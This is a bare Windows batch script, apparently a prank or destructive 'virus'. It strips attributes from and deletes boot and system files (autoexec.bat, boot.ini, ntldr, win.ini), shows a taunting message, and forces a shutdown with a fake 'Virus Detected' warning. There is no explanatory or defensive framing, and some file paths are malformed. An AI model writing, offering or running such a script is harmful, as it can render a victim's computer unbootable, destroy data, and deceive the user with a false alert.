@echo off

attrib -r -s -h c:autoexec.bat

del c:autoexec.bat

attrib -r -s -h c:boot.ini

del c:boot.ini

attrib -r -s -h c:ntldr

del c:ntldr

attrib -r -s -h c:windowswin.ini

del c:windowswin.ini

@echo off

msg * Why have you done this?

shutdown -s -t 7 -c "Virus Detected, Shutting Down."
